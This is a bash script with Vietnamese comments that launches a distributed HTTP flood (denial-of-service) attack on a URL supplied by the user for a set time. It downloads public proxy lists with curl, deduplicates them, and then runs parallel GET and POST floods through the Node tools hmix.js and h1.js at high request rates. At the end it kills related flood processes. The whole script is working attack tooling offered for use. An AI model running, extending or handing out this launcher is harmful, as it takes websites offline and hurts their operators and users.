#!/bin/bash

# Cài đặt các module cần thiết
# npm install colors randomstring user-agents hpack axios https commander socks node-telegram-bot-api

# Kiểm tra số lượng tham số
if [ $# -lt 2 ]; then
    echo "Usage: $0 {URL} {TIME}"
    exit 1
fi

URL=$1
TIME=$2
tep_tam=$(mktemp)
tong=0
# https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&timeout=7000&protocol=$loai
# https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${loai}/Vietnam.txt
# Lấy proxy từ các loại HTTP, HTTPS, SOCKS4, SOCKS5
for loai in http https; do 
  lien_ket="https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${loai}/Vietnam.txt"
  
  # Tải về và xử lý định dạng (đảm bảo mỗi proxy 1 dòng)
  so_luong=$(curl -s "$lien_ket" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]+' | tee -a "$tep_tam" | wc -l)
  
  echo "$loai: $so_luong proxy"
  ((tong+=so_luong))
done

echo "Tổng trước lọc: $tong"

# Xử lý file tạm (loại bỏ dòng trống và sắp xếp)
grep -v '^$' "$tep_tam" | sort -u -o live.txt

echo "Tổng sau lọc: $(wc -l < live.txt) | IP duy nhất: $(awk -F: '{print $1}' live.txt | sort -u | wc -l)"
rm -f "$tep_tam"
wait

export NODE_OPTIONS=--max-old-space-size=8192
# Chạy tấn công với hmix.js
for method in GET POST; do 
  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 32 --full true -d false &
done

# Chạy tấn công với h1.js
for method in GET POST; do 
  node h1.js "$method" "$URL" live.txt "$TIME" 128 5 randomstring=true &
done
wait

# Dừng tất cả tiến trình liên quan
pgrep -f "negan.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js" | xargs -r kill -9
